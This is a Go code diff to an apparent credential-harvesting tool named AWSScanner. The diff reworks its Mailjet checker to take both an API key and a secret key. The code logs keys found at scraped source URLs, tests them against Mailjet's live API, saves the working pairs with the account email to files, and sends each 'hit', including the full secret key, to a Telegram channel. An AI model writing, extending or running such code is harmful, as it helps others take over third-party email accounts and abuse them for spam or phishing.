@@ -5,17 +5,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
-	"regexp"
 	"time"
 )
 
-var mailjetPattern = regexp.MustCompile(`(?i)(?:mailjet[_-]?(?:api[_-]?)?(?:key|public))["'\s:=]+([a-f0-9]{32})`)
-
-func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
+func (a *AWSScanner) CheckMailjet(apiKey, secretKey, sourceURL string) bool {
 	if !a.Config.APIValidation.Mailjet {
 		return false
 	}
-	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+	combined := apiKey + ":" + secretKey
+	if _, loaded := a.KnownKeys.LoadOrStore(combined, true); loaded {
 		return false
 	}
 
@@ -23,13 +21,13 @@ func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "mailjet_found.txt")
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, combined), "mailjet_found.txt")
 
 	req, err := http.NewRequest("GET", "https://api.mailjet.com/v3/REST/user", nil)
 	if err != nil {
 		return false
 	}
-	req.SetBasicAuth(key, key)
+	req.SetBasicAuth(apiKey, secretKey)
 	req.Header.Set("Accept", "application/json")
 
 	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
@@ -57,16 +55,16 @@ func (a *AWSScanner) CheckMailjet(key, sourceURL string) bool {
 		info = res.Data[0].Email
 	}
 
-	a.logValid("Mailjet", fmt.Sprintf("Key: %s | Email: %s", key, info))
-	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_mailjet.txt")
-	a.storeValidKeyLimit("Mailjet", key, info)
+	a.logValid("Mailjet", fmt.Sprintf("APIKey: %s | SecretKey: %s | Email: %s", apiKey, secretKey, info))
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, combined), "valid_mailjet.txt")
+	a.storeValidKeyLimit("Mailjet", combined, info)
 
 	globalCounters.mu.Lock()
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
 	msg := a.tgHit("✉️", "MAILJET", sourceURL) + fmt.Sprintf(
-		"\n🔑 <b>Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n", key, info)
+		"\n🔑 <b>API Key:</b> <code>%s</code>\n🔐 <b>Secret Key:</b> <code>%s</code>\n📧 <b>Email:</b> %s\n", apiKey, secretKey, info)
 	go a.sendTelegram(msg)
 	return true
 }
